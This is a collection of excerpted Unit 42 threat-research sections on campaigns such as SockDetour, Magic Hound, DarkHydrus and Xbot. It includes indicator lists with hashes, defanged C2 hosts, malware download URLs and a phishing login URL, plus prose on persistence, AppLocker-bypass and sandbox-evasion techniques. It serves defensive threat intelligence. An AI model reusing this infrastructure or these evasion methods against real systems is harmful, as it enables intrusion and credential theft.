WildFire, URL filtering, and IPS services. An AutoFocus tag has also been created to identify this family and its variants. Customers can also refer to IPS signature (13997) for details about Xbot C2 traffic information.\nWe greatly appreciate the help from Rongbo Shao, Yi Ren, Bowen Jiao, Michael Scott, Jen Miller-Osborn, Chad Berndtson, Chris Clark, and Ryan Olson from Palo Alto Networks in working on the analysis and coverage of Xbot family.", "source": "Palo"}, {"title": "IOC", "content": "dfda8e52df5ba1852d518220363f81a06f51910397627df6cdde98d15948de65 \ne905d9d4bc59104cfd3fc50c167e0d8b20e4bd40628ad01b701a515dd4311449 \nf2cfbc2f836f3065d5706b9f49f55bbd9c1dae2073a606c8ee01e4bbd223f29f \n029758783d2f9d8fd368392a6b7fdf5aa76931f85d6458125b6e8e1cadcdc9b4 \n1264c25d67d41f52102573d3c528bcddda42129df5052881f7e98b4a90f61f23 \n20bf4c9d0a84ac0f711ccf34110f526f2b216ae74c2a96de3d90e771e9de2ad4 \n33230c13dcc066e05daded0641f0af21d624119a5bb8c131ca6d2e21cd8edc1a \n4b5ef7c8150e764cc0782eab7ca7349c02c78fceb1036ce3064d35037913f5b6 \n7e939552f5b97a1f58c2202e1ab368f355d35137057ae04e7639fc9c4771af7e \n93172b122577979ca41c3be75786fdeefa4b80a6c3df7d821dfecefca1aa6b05 \na22b55aaf5d35e9bbc48914b92a76de1c707aaa2a5f93f50a2885b0ca4f15f01 \nd082ec8619e176467ce8b8a62c2d2866d611d426dd413634f6f5f5926c451850 \na94cac6df6866df41abde7d4ecf155e684207eedafc06243a21a598a4b658729 \n58af00ef7a70d1e4da8e73edcb974f6ab90a62fbdc747f6ec4b021c03665366a \n7e47aaa8a1dda7a413aa38a622ac7d70cc2add1137fdaa7ccbf0ae3d9b38b335 \nd1e5b88d48ae5e6bf1a79dfefa32432b7f14342c2d78b3e5406b93ffef37da03 \nc2354b1d1401e31607c770c6e5b4b26dd0374c19cc54fc5db071e5a5af624ecc \n12f75b8f58e1a0d88a222f79b2ad3b7f04fd833acb096bb30f28294635b53637 \n1b84e7154efd88ece8d6d79afe5dd7f4cda737b07222405067295091e4693d1b \n616b13d0a668fd904a60f7e6e18b19476614991c27ef5ed7b86066b28952befc \n2e2173420c0ec220b831f1c705173c193536277112a9716b6f1ead6f2cad3c9e \n595fa0c6b7aa64c455682e2f19d174fe4e72899650e63ab75f63d04d1c538c00\nmelon25[.]ru \n81[.]94.205.226:8021 \n104[.]219.250.16:8022 \nhxxp://52[.]24.219.3/action.php \nhxxp://192[.]227.137.154/request.php \nhxxp://23[.]227.163.110/locker.php \nhxxp://market155[.]ru/Install.apk \nhxxp://illuminatework[.]ru/Install.apk \nhxxp://yetiathome15[.]ru/Install.apk \nhxxp://leeroywork3[.]co/install.apk \nhxxp://morning3[.]ru/install.apk", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has been tracking an APT campaign we name TiltedTemple, which we first identified in connection with its use of the Zoho ManageEngine ADSelfService Plus vulnerabilityCVE-2021-40539and ServiceDesk Plus vulnerability CVE-2021-44077. The threat actors involved use a variety of techniques to gain access to and persistence in compromised systems and have successfully compromised more than a dozen organizations across the technology, energy, healthcare, education, finance and defense industries. In conducting further analysis of this campaign, we identified another sophisticated tool being used to maintain persistence, which we call SockDetour.\nA custom backdoor, SockDetour is designed to serve as a backup backdoor in case the primary one is removed. It is difficult to detect, since it operates filelessly and socketlessly on compromised Windows servers. One of the command and control (C2) infrastructures that the threat actor used for malware distribution for the TiltedTemple campaign hosted SockDetour along with other miscellaneous tools such as a memory dumping tool and several webshells. We are tracking SockDetour as one campaign within TiltedTemple, but cannot yet say definitively whether the activities stem from a single or multiple threat actors.\nBased on Unit 42's telemetry data and the analysis of the collected samples, we believe the threat actor behind SockDetour has been focused on targeting U.S.-based defense contractors using the tools. Unit 42 has evidence of at least four defense contractors being targeted by this campaign, with a compromise of at least one contractor.\nUnit 42 also believes it is possible that SockDetour has been in the wild since at least July 2019. We did not find any additional SockDetour samples on public repositories, meaning that the backdoor successfully stayed under the radar for a long time.\nFull visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in theUnit 42 ATOM viewer.\nPalo Alto Networks customers are protected from the threats described in this blog byCortex XDRandWildFire, and can useAutoFocusfor tracking related entities. Additionally, the YARA rule we attached at the end of this blog post can be used to detect SockDetour in memory.", "source": "Palo"}, {"title": "Background", "content": "TiltedTemple is the name Unit 42 gives to a campaign being conducted by an advanced persistent threat (APT) or APTs, leveraging a variety of initial access vectors, to compromise a diverse set of targets globally. Our initial publications on TiltedTemple focused on attacks that occurred through compromisedManageEngine ADSelfService Plus serversand throughManageEngine ServiceDesk Plus.\nThe TiltedTemple campaign has compromised organizations across the technology, energy, healthcare, education, finance and defense industries and conducted reconnaissance activities against these industries and others, including infrastructure associated with five U.S. states.\nWe found SockDetour hosted on infrastructure associated with TiltedTemple, though we have not yet determined whether this is the work of a single threat actor or several.", "source": "Palo"}, {"title": "Conclusion", "content": "SockDetour is a backdoor that is designed to remain stealthily on compromised Windows servers so that it can serve as a backup backdoor in case the primary one fails. It is filelessly loaded in legitimate service processes and uses legitimate processes' network sockets to establish its own encrypted C2 channel.\nWhile it can be easily altered, the compilation timestamp of the SockDetour sample we analyzed suggests that it has likely been in the wild since at least July 2019 without any update to the PE file. Plus, we did not find any additional SockDetour samples on public repositories. This suggests that the backdoor successfully stayed under the radar for a long time.\nThe plugin DLL remains unknown, but it is also expected to operate very stealthily by being delivered via the SockDetour's encrypted channel, being loaded filelessly in memory and communicating via hijacked sockets.\nAs an additional note, the type of NAS server that we found hosting SockDetour is typically used by small businesses. This example serves as a critical reminder to patch this type of server frequently when fixes are released.", "source": "Palo"}, {"title": "Indicators", "content": "SockDetour PE\n0b2b9a2ac4bff81847b332af18a8e0705075166a137ab248e4d9b5cbd8b960df\nPowerSploit Memory Injectors Delivering SockDetour\n80ed7984a42570d94cd1b6dcd89f95e3175a5c4247ac245c817928dd07fc9540bee2fe0647d0ec9f2f0aa5f784b122aaeba0cddb39b08e3ea19dd4cdb90e53f9a5b9ac1d0350341764f877f5c4249151981200df0769a38386f6b7c8ca6f9c7a607a2ce7dc2252e9e582e757bbfa2f18e3f3864cb4267cd07129f4b9a241300b11b2b719d6bffae3ab1e0f8191d70aa1bade7f599aeadb7358f722458a21b530cd28c7a63f91a20ec4045cf40ff0f93b336565bd504c9534be857e971b4e80eeebe926f37e7188a6f0cc85744376cdc672e495607f85ba3cbee69800499518893ea2bf2a6b039071b890f03b5987d9135fe4c036fb77f477f1820c34b341644e7e9cf2a2dd3edac92175a3eb1355c0f5f05f47b7798e206b470637c5303ac79fbb48438e2ed47ab692d1754305df664cda6c518754ef9a58fb5fa8545f5bfb9b\nPublic Key Embedded in SocketDetour\n-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDWD9BUhQQZkagIIHsCdn/wtRNXcYoEi3Z4PhZkH3mar20EONVyXWP/YUxyUmxD+aTOVp3NB+XYOO9LqQEAWgyGndXyyuDssLWTb7z54n8iDu2pqiAEvJ6h18iwf0EwZ1BzPBDS1Kw+JE4tYIR860rD1DBul0u6OURqMPb5eZT1bQIDAQAB-----END PUBLIC KEY-----\nYARA Rule for Detecting SockDetour in Memory", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have identified a growing trend of cyberattacks targeting web applications and application programming interfaces (APIs) hosted by cloud service providers. Based on the data from our research, 14.9% of attacks in late 2022 on web applications and APIs targeted cloud-hosted deployments.\nAttackers are also operating in the cloud and using it to launch their attacks on applications and APIs, as 5.1% of the attacks originated from cloud service providers' addresses. We will discuss what web and API attacks are and why attackers are exploiting them in the cloud. We will also review possible reasons for attacks originating from the cloud, as well as the potential impact on businesses and individuals.\nPalo Alto Networks customers usingPrisma Cloudare protected from these threats through theWAASmodule, which is designed to protect web applications and APIs in cloud environments.", "source": "Palo"}, {"title": "Conclusion", "content": "In light of this research, organizations must be vigilant in securing their cloud environments, ensuring proper configurations, and monitoring for potential threats. By understanding the risks and implementing robust security measures, businesses can better protect their web applications and APIs from cloud-based attacks.\nAs more businesses shift their web applications and APIs to the cloud, attackers might perceive these environments as attractive targets, offering a wealth of valuable data and resources. This trend underscores the importance of implementing robust security measures to safeguard cloud-hosted web applications and APIs.\nPalo Alto Networks customers usingPrisma Cloudare protected from these threats through theWAASmodule, which is designed to protect web applications and APIs in cloud environments.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks recently identified a new campaign targeting the transportation sector in Europe with ties to the Dark Seoul and Operation Troy campaigns that took place in 2013. This new campaign used updated instances of the Tdrop malware family discovered in the Operation Troy campaign. For more information on the new campaign discovered by Unit 42, please refer to our recentblog post.\nIn this attack, attackers embedded the TDrop2 malware inside a legitimate video software package hosted on the software distributor's website. By doing this, they were able to target organizations that relied on the distributor's security camera solution and infect their systems with malware. They created a true Trojan horse, which sneaks into a network as a gift, but when opened, the attacker's army leaps out.", "source": "Palo"}, {"title": "Conclusion", "content": "The TDrop2 malware family that was witnessed in a recent attack against a European transportation company provided a minimal set of commands to the attackers. It was most likely used to establish a foothold, perform reconnaissance and deploy further malware into the victim's network. While the malware lacked a large set of capabilities, it had a wealth of interesting and advanced features, such as the custom encryption/encoding witnessed in the network traffic, the use of process hollowing against a randomly selected Microsoft Windows binary, and the downloading component that attempted to bypass network security measures by modifying the executable header.\nWe created the AutoFocus tagTDrop2to identify samples of this new variant and added known C2 domains and hash values to the Threat Prevention product set. At this time, WildFire is able to correctly identify the samples associated with this campaign as malicious.", "source": "Palo"}, {"title": "Introduction", "content": "The domain name system (DNS) maps names to addresses so that computers can communicate. The directions within the DNS exist largely in records where aspecificname (such aspaloaltonetworks.com) is mapped to pieces of data, such as IP addresses (for example,34.107.151[.]202). As the name suggests, wildcard DNS records are an exception to this pattern: They allowmanydomain names to be mapped to the same data.\nWildcard records facilitate DNS management in many constructive operations, for example, when a website owner is trying to direct users to an appropriate webpage if the users attempt to access a nonexistent subdomain. However, the flexibility of wildcard records also provides attackers with a variety of options for executing attacks with greater efficiency. Wildcard records allow attackers to easily direct users to malicious hosts via a nearly infinite number of domain names. This potential of wildcard DNS records has led attackers to deploy them for various purposes, including black hat search engine optimization (SEO), phishing campaigns and circumventing network protections. Distinguishing between domains using wildcard records for benign and malicious purposes poses a nontrivial challenge. Here, we describe some of the key characteristics of wildcard DNS abuse, and how recognizing them can help address this challenge.\nPalo Alto Networks applies these principles in a wildcard DNS abuse detection system that efficiently flags domains that use wildcard DNS records for questionable or malicious activity. Our detections reveal multiple networks of domains involved in black hat SEO, the distribution of adult content or gambling services, and questionable video streaming.\nThe insights generated by this detector are available toPalo Alto Networks Next-Generation Firewallcustomers withsecurity subscriptions, includingDNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "We highlighted the importance of investigating wildcard DNS usage and detecting the abuse of these records. Wildcard DNS records have legitimate use, but are also a valuable tool for miscreants executing a variety of serious attacks. If interpreted carefully, the appearance of wildcards in a domain's DNS records provides a hint that the domain may be used for malicious purposes. Our detector has found thousands of such domains abusing wildcard DNS records.\nPalo Alto Networks detects domains abusing wildcard DNS records and assigns them to the grayware category through oursecurity subscriptions for Next-Generation Firewalls. These subscriptions includeDNS SecurityandAdvanced URL Filtering. Through this detector, we protect our customers from risks associated with the types of domains discussed above.", "source": "Palo"}, {"title": "Introduction", "content": "Cybercriminals compromise domain names to attack the owners or users of the domains directly, or use them for various nefarious endeavors, including phishing, malware distribution, and command and control (C2) operations. A special case of DNS hijacking is called domain shadowing, where attackers stealthily create malicious subdomains under compromised domain names. Shadowed domains do not affect the normal operation of the compromised domains, making it hard for victims to detect them. The inconspicuousness of these subdomains often allows perpetrators to take advantage of the compromised domain's benign reputation for a long time.\nCurrent threat research-based detection approaches are labor-intensive and slow as they rely on the discovery of malicious campaigns that use shadowed domains before they can look for related domains in various data sets. To address these issues, we designed and implemented an automated pipeline that can detect shadowed domains faster on a large scale for campaigns that are not yet known. Our system processes terabytes of passive DNS logs every day to extract features about candidate shadowed domains. Building on these features, it uses a high-precision machine learning model to identify shadowed domain names. Our model finds hundreds of shadowed domains created daily under dozens of compromised domain names.\nEmphasizing the difficulty of discovering shadowed domains, we found that only 200 domains were marked as malicious by vendors on VirusTotal out of 12,197 shadowed domains automatically detected by us between April 25 and June 27, 2022. As an example, we give a detailed account of a phishing campaign leveraging 649 shadowed subdomains under 16 compromised domains such asbancobpmmavfhxcc.barwonbluff.com[.]auandcarriernhoousvz.brisbanegateway[.]com. The perpetrators leveraged the benign reputation of these domains to spread fake login pages harvesting credentials. VT vendor performance is much better for this specific campaign, marking as malicious 151 out of the 649 shadowed domains \u2013 but still less than one quarter of all the domains.\nPalo Alto Networks provides protection against shadowed domains leveraging our automated classifier in multiplePalo Alto Networks Next-Generation Firewallcloud-delivered security services, includingDNS SecurityandAdvanced URL Filtering. Additionally, customers can leverageCortex XDRto alert on and respond to domain shadowing when used for C2 communications.", "source": "Palo"}, {"title": "Conclusion", "content": "Cybercriminals use shadowed domains for various illicit ventures, including phishing and botnet operations. We observe that it is challenging to detect shadowed domains as vendors on VirusTotal cover less than 2% of these domains. As traditional approaches based on threat research are too slow and fail to uncover the majority of shadowed domains, we turn to an automated detection system based on pDNS data. Our high-precision machine learning-based detector processes terabytes of DNS logs and discovers hundreds of shadowed domains daily. Palo Alto Networks offers multiple security subscriptions \u2013 includingDNS SecurityandAdvanced URL Filtering\u2013 that leverage our detector to protect against shadowed domains. Additionally, customers can leverageCortex XDRto alert on and respond to domain shadowing when used for command and control communications.", "source": "Palo"}, {"title": "Indicators", "content": "halont.edu[.]autraining.halont.edu[.]auocwdvmjjj78krus.halont.edu[.]aubaqrxmgfr39mfpp.halont.edu[.]aubarwonbluff.com[.]aubancobpmmavfhxcc.barwonbluff.com[.]ausnaitechbumxzzwt.barwonbluff[.]com.ausnaitechbumxzzwt.barwonbluff.com[.]au/bumxzzwt/xxx.yyy@target.ittomsvprfudhd.barwonbluff.com[.]aubrisbanegateway[.]comcarriernhoousvz.brisbanegateway[.]comvembanadhouse[.]comwiguhllnz43wxvq.vembanadhouse[.]comlogin.elitepackagingblog[.]comlogin.elitepackagingblog[.]com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637823463352371687.MDY0MjMzYjMtOWNlZC00ODA5LWE1YWQtOWMyMTIwYTZiOTIwODZiNTMyN2MtZWQ3ZC00Mzg4LWJjMzktNGQxYjQ1MDFkNmNi&ui_locales=en-US&mkt=en-US&state=q81i2V5Z572r5P2TuEfGYg0HZLgy9vMW3HMxjfeMMm60rJIlPgKe4SKR8D86gIjkNlgD6cd8jK754mEWDiHZtRQ1pzeGpqaVJOCkSmAUGOWUcOxbKCr2sPnoBds6H7fZCJdLqcotpA2NF3vvVbRDSSWk3xhQuxnXOoJoN2pj0RhiR97YEUkUwqEEsCoboffTLGgVrjaDy_ASgmhE_7mkvYE6YsXicgxoEzDqhrjxB_vFcTt_u7o1rrAYcWIv-0vZ4vPVToJ7Nwqlf6BHPz7zPQ&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0&sso_reload=true#ODQuMTccGFvbGEucGVsbGVnYXRhQHNuYWl0ZWNoLml0=", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has discovered Zloader and BazarLoader samples that had interesting implementations of a sandbox evasion technique. This blog post will go into details of the unique implementations of API Hammering in these types of malware. API Hammering involves the use of a massive number of calls to Windows APIs as a form of extended sleep to evade detection in sandbox environments.\nSandboxing is a popular technique used to detect if a sample is malicious. A sandbox analyzes the behaviors of the binary as it executes inside a controlled environment. Sandboxes have to deal with many challenges while analyzing a large number of binaries with limited computing resources. Malware sometimes abuses these challenges by \"sleeping\" in the sandbox before carrying out malicious procedures to hide its real intentions.\nPalo Alto Networks customers receive protections from malware families using evasion techniques throughCortex XDRor the Next-Generation Firewall withWildFireandThreat Preventionsecurity subscriptions.", "source": "Palo"}, {"title": "Conclusion", "content": "Results from analyzing various implementations of API Hammering enabled the detection of malware samples using API Hammering for sandbox evasion inWildFire. WildFire detects the use of API Hammering by BazarLoader, Zloader, and other malware families.\nThe following excerpt from the WildFire report of our BazarLoader sample shows the detected entry for API Hammering.\nPalo Alto Networks customers receive further protections against other malware families using similar sandbox evasion techniques through Cortex XDR or our Next-Generation Firewall with WildFire and Threat Prevention security subscriptions.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has discovered a persistent attack campaign operating primarily in the Middle East dating back to at least mid-2016 which we have named Magic Hound. This appears to be an attack campaign focused on espionage. Based upon our visibility it has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia. The adversaries appear to have evolved their tactics and techniques throughout the tracked time-period, iterating through a diverse toolset across different waves of attacks. Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called \"RocketKitten\" (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters. Artifacts of this campaign was also recently published bySecureworks CTU.\nWe were able to collect over fifty samples of the tools used by the Magic Hound campaign using theAutoFocusthreat intelligence tool. The earliest malware sample we were able to collect had a compile timestamp in May 2016. The samples themselves ranged from IRC bots, an open source Python remote access tool, malicious macros, and others. It is believed the use of specific tools may have coincided with specific attack waves by this adversary, with the most recent attacks using weaponized Microsoft Office documents with malicious macros. Due to the large amount of data collected, and limitations on attack telemetry, this blog will focus primarily on the most recent attacks occurring in the latter half of 2016.", "source": "Palo"}, {"title": "Conclusion", "content": "The Magic Hound attack campaign is an active and persistent espionage motivated adversary operating in the Middle East region. Organizations in the government, energy, and technology sectors have been targeted by this adversary, specifically organizations based in or doing business in Saudi Arabia. The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public. None of the tools we uncovered were found to be exploit-driven, and relied exclusively on social engineering tactics to compromise targets. While we did discover a potential relationship with the Rocket Kitten adversary group, we cannot confirm the extent of that relationship at this time, although we will continue to monitor the activities of Magic Hound.\nPalo Alto Networks customers are protected via the following:\nWildFire identification and detection of malicious samples \nCommand and control servers are classified as malicious \nAutoFocus tags have been createdMagic HoundMagicHound DropItMagicHound FetchMagicHound RetrieverMagicHound RolloverMagicHound LeashMagicHound MPKBotPuPYRAT \nMagic Hound \nMagicHound DropIt \nMagicHound Fetch \nMagicHound Retriever \nMagicHound Rollover \nMagicHound Leash \nMagicHound MPKBot \nPuPYRAT", "source": "Palo"}, {"title": "Indicators", "content": "MagicHound.DropIt SHA256\nc21074f340665935e6afe2a972c8d1ab517954e2dd05cc73e5ff0e8df587b99d\nea139a73f8ec75ea60dfa87027c7c3ef4ed61b45e1acb5d1650cc54e658984ba\nda2abdc951e4b2272fea5c8989debd22e26350bab4b4219104bccec5b8a7ff5a\n0d3ae682868cb3ff069ec52e1ffc5ef765453fd78e47b6366d96aebb09afd8ab\nf0ecc4388f0d84501499711681a64a74c5d95e0bb6a2174cbe3744bd5a456396\n860f4cd44371a180a99bc16526f54f8b051c420a3df334d05d569d0cdadac3d2\nb42b1186211633c2d47f3d815f0371ba234fee2ed0f26e487badc58e1ab81061\n4beee6e7aa244335e161fdc05296ea100090c2114b4ff2e782e3ee3e1f936fdf\n5e0e09c9860b293c4c9a2382a7392963adc54d6a23440abb9a2d89c50f8fd305\n3161f9087d89a2d036ea32741d5a006c6bb279d36ff8d1acde63f2e354f8c502\nMagicHound.Fetch PE SHA256\nb6c159cad5a867895fd41c103455cebd361fc32d047b573321280b1451bf151c\n6a7537f2cedbf453114cfba086e4746e698713777fb4fa4fc8964247dde741ed\n16d87fbd8667677da1af5433b6d797438f8dc0ab565fb40ecb29f83f148888cd\n92bc7d04445cf67aa7ddf15792cd62778d2d774d06616d1986f4c389b3d463f5\n86d3409c908f667dd298b6a7e1e17652bb29af73e7daed4a5e945fbdf742e9f4\nc3a8f5176351e87d28f45e58c79bb6646bb5d94ade7a24c6556514c860004143\na390365ddfcce146a8fa8435022f19b9a1be29f2b11a049cb660ec53f36beb06\nd2ffc757a12817e4b58b3d58d71da951b177dedd3f65ca41fad04a03fc63fac6\n79c9894b50cde62b182bd1560060c5c2bf5a1cef2b8afdffc4766e8c55ff6932\n2f7f3582504fbce349a6991fbb3b5f9577c5c014b6ce889b80d51977fa6fb31a\n8c2e4aa8d73ad2e48d70dfa18abea62769c7bef59c8c1607720f4f6162413f75\nabe8e86b787998a07411ee24f3f3d8a79e37c6da539650ceed566b081f968c26\n9e4d2e983f8a807f741f8873e6fa5d222dc6f3b358ccfc3a6c700398b342f656\ne57f77cc3d117923ec01aa0e044edc11b1042e57993ca7f74d971630893ca263\nca6e823dedd6ca5fada2b1fa63d0acb288027f5a3cdd2c60dcace3c424c5ced0\neaaecabb439c81e522d9f5681fdb047ee62381e763f0d9646e68cd507479ba5a\n1c3e527e496c4b0594a403d6d582bc6db3029d27369720d0d5122f862b10d8f1\n29a659fb0ef0262e4de0dc3c6a140677b6ddee13c1819b791bd280be0547e309\nMagicHound.Fetch PE C2\nservice.chrome-up[.]date\nwww3.chrome-up[.]date\nwww7.chrome-up[.]date\ntimezone[.]live\nservice1.chrome-up[.]date\n104.238.184[.]252\nwww5.chrome-up[.]date\nservicesystem.serveirc[.]com\nMagicHound.Fetch DOC SHA256\n218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2\ne5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6\n71e584e7e1fb3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087\n388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ff21d2073c56ea565d\n33ee8a57e142e752a9c8960c4f38b5d3ff82bf17ec060e4114f5b15d22aa902e\n5469facc266d5582bd387d69032a91c8fff373213b66a2f0852666e72bcdc1da\n528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62\n66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b\ncfce4827106c79a81eef6d3a0618c90bf5f15936036873573db76bed7e8a0864\n68db2b363a88b061cc9063535f3920673f1f08d985b14cb52b898ced6c0f8964\ne837f6b814c09900726dac2cf55f41babf361152875ba2a765a34ee5cc496087\nf912d40de9fe9a726448c1d84dfba2d4941f57210b2dbc035f5d34d68e8ac143\naf0ae0fa877f921d198239b7c722e12d14b2aa32fdfadaa37b47f558ae366de9\n6d1a50ca3e80442fa3e2caca86c166ed60bef32c2d0af7352cd227303cdec031\nMagicHound.Fetch DOC C2\n45.76.128[.]165\n139.59.46[.]154\n104.218.120[.]128\n89.107.62[.]39\n69.87.223[.]26\nanalytics-google[.]org\n89.107.60[.]11\nwww3.chrome-up[.]date\nwww.microsoftsubsystem.com-adm[.]in\nwww1.chrome-up[.]date\nMagicHound.Fetch XLS SHA256\n6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b\n97943739ccf8a00036dd3cdd0ba48e17a82ab9b65cc22c17c6e6258e72bb9ade\nMagicHound.Fetch XLS C2\n45.76.128[.]165\n139.59.46[.]154\nPupy Loaders SHA256\n7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73\ndb453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f\n82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190\nPupy Loaders C2\n139.59.46[.]154\nwww1.chrome-up[.]date\nMagicHound.Retriever SHA256\n1c550dc73b7a39b0cd21d3de7e6c26ece156253ac96f032efc0e7fcc6bc872ce\n7cdbf5c035a64cb6c7ee8c204ad42b4a507b1fde5e6708ea2486942d0d358823\nb2ea3fcd2bc493a5ac86e47029b076716ed22ef4487f9090f4aa1923a48015d6\n3f23972a0e80983351bedf6ad45ac8cd63669d3f1c76f8834c129a9e0418fff1\nMagicHound.Retriever C2\nservice.chrome-up[.]date\nmsservice[.]site\nmicrosoftexplorerservices[.]cloud\nMagicHound.Leash SHA256\n133959be8313a372f7a8d95762722a6ca02bc30aaffde0cbcf6ba402426d02f5\nba3560d3c789984ca29d80f0a2ea38a224e776087e0f28104569630f870adaf4\nd8731a94d17e0740184910ec81ba703bad5ff7afc92ba056f200533f668e07bf\nMagicHound.Leash C2\n45.56.123[.]129\nsyn.timezone[.]live\nMPKBot SHA256\nd08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19\nMPKBot C2\n45.58.37[.]142", "source": "Palo"}, {"title": "Introduction", "content": "Figure 1: Attacker infrastructure(Click to view full size.)\nThe following primary C2 servers for the malware variants were identified:\njbossas[.]org \nsupermanbox[.]org \nmicrosoft-cache[.]com\nThe 'jbossas' and 'supermanbox' domains were found to resolve to the same Hong Kong based IP address, 121.54.168.230. A total of three unique samples were identified communicating with these two domains using the raw network protocol communicating over port 22. They used what appeared to be three separate legitimate websites that looked to be compromised for malware distribution.\nThe 'microsoft-cache' domain was used by the malware variant that communicated over HTTP. We found four unique samples communicating with this domain, which resolved to the same Hong Kong-based IP address used by the first two domains.", "source": "Palo"}, {"title": "Conclusion", "content": "The tactics, techniques, and procedures (TTPs) used by C0d0so0 appear to be more sophisticated than many other adversary groups with multiple layers of obfuscation in use, as well as specific victim targeting in what appears to be an attempt at creating a staging area for additional attack.\nUnit 42 will continue observation and research on this group's activity, as it appears this may be the beginning of the campaign. At this time, the following protections are in place for Palo Alto Networks customers:\nWildFire properly identifies samples as malicious \nAutoFocus tagcreated \nDomains flagged as malicious", "source": "Palo"}, {"title": "IOC", "content": "Hashes\n3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa3577845d71ae995762d4a8f43b21ada49d809f95c127b770aff00ae0b64264a3ea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0de33dfce8143f9f929abda910632f7536ffa809603ec027a4193d5e57880b292b690394540cab9b7f8cc6c98fd95b4522b84d1a5203b19c4974b58829889da4cde984eda2dc962fde75093d876ec3fe525119de841a96d90dc032bfb993dbdacccf87057a4ab02e53bff5828d779a6e704b040aef863f66e8f571638d7d50cd2\nDomains\nwww.jbossas[.]orgsupermanbox[.]orgwww.supermanbox[.]orgwww.microsoft-cache[.]com\nIPs\n121.54.168.230218.54.139.20210.181.184.6442.200.18.194\nURLs\n218.54.139.20/example/McAltLib.dll210.181.184.64/example/McAltLib.dll42.200.18.194/example/McAltLib.dll", "source": "Palo"}, {"title": "Introduction", "content": "In this second part ofUnit 42's Cybercrime Underground blog series, we dive into the cybercrime forum ecosystem and focus on observed cybercriminal roles, as well as prevalent tools and services bought and sold in the underground. The goal of this post is not to provide an exhaustive directory, but rather to provide additional context on the operations and highly prevalent threats observed within this ecosystem.", "source": "Palo"}, {"title": "Introduction", "content": "We collected a total of three DarkHydrus delivery documents installing a new variant of the RogueRobin trojan. These three documents were extremely similar to each other and are all macro enabled Excel documents with.xlsmfile extensions. None of the known documents contain a lure image or message to instruct the recipient to click theEnable Contentbutton necessary to run the macro, as seen in Figure 1. While we cannot confirm the delivery mechanism, it is likely that the instructions to click theEnable Contentbutton were provided during delivery, such as in the body of a spear-phishing email.\nFigure 1 DarkHydrus' delivery document does not have a lure image or message\nWithout the delivery mechanism we cannot confirm the exact time these delivery documents were used in an attack; however, the observed timestamps within these three delivery documents gives us an idea when the DarkHydrus actors created them. While the creation times were timestomped to a default time of2006-09-16 00:00:00Zcommonly observed in malicious documents, the Last Modified times were still available and suggest that DarkHydrus created these documents in December 2018 and January 2019. Table 1 shows the breakdown of timestamps and their associated sample hashes.\nTable 1 Timestamps of delivery documents\nThe macro executes immediately after pressing theEnable Contentbutton thanks to theWorkbook_Opensub-function, which will call the actor createdNew_Macrofunction. The New_Macro function starts by concatenating several strings to create a PowerShell script that it will write to the file%TEMP%\\WINDOWSTEMP.ps1. The function builds the contents of a second file by concatenating several strings together, but this second file is a.sctfile that the function will write to a file%TEMP%\\12-B-366.txt. While.sctfiles are used by a multitude of applications, in this instance it is being used as a Windows Script Component file. The function then uses the built-in Shell function to run the following command, which effectively executes the.sctfile stored in12-B-366.txt:\nThe use of the legitimateregsvr32.exeapplication to run a.sctfile is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in aMetasploit module. TheWINDOWSTEMP.ps1script is a dropper that decodes an embedded executable using base64 and decompresses it with theSystem.IO.Compression.GzipStreamobject. The script saves the decoded and decompressed executable to%APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exeand creates an LNK shortcut at%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnkto persistently runWindowsTemplate.exeeach time Windows starts up. TheWindowsTemplate.exeexecutable is a new variant of RogueRobin written in C#.", "source": "Palo"}, {"title": "Conclusion", "content": "The DarkHydrus group continues their operations and adds new techniques to their playbook. Recent DarkHydrus delivery documents revealed the group abusing open-source penetration testing techniques such as the AppLocker bypass. The payloads installed by these delivery documents show that the DarkHydrus actors ported their previous PowerShell-based RogueRobin code to an executable variant, which is behavior that has been commonly observed with other adversary groups operating in the Middle East, such as OilRig. Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure.\nPalo Alto Networks customers are already be protected via:\nAll samples in this report have a malicious verdict in WildFire \nDomains have been classified as malicious \nAutoFocus tags are available for additional context:DarkHydrusandRogueRobin", "source": "Palo"}, {"title": "Indicators", "content": "Delivery Document 